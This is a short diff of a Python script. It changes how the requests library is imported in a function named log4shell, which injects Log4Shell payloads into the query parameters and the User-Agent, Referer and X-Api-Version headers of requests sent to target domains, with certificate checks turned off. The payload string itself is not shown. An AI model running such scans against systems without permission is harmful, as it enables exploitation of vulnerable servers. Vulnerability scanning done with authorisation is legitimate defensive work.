@@ -14,7 +14,7 @@ import string
 import datetime as dt
 from operator import itemgetter
 from concurrent.futures import TimeoutError, ProcessPoolExecutor
-from requests import get
+import requests
 from nats.aio.client import Client as NATS
 import urllib3
 urllib3.disable_warnings()
@@ -44,9 +44,9 @@ def log4shell(domain):
     try:
         params = {'id': payload(fakedomain, "params-id")}
         headers = {'User-Agent':payload(fakedomain, "User-Agent"), 'Referer':payload(fakedomain, "Referer"), 'X-Api-Version': payload(fakedomain, "X-Api-Version")}
-        response = get(f"http://{domain}", headers=headers, params=params, verify=False, timeout=1)
+        response = requests.get(f"http://{domain}", headers=headers, params=params, verify=False, timeout=1)
         if response.history == []:
-            response = get(f"https://{domain}", headers=headers, params=params, verify=False, timeout=1)
+            response = requests.get(f"https://{domain}", headers=headers, params=params, verify=False, timeout=1)
         to_json({'domain': domain, 'status': response.status_code, 'redirects': list(map(lambda res: res.url, response.history))})
     except requests.RequestException as e:
         to_json({'exception': True, 'status': e.response.status_code, 'text': e.response.text})
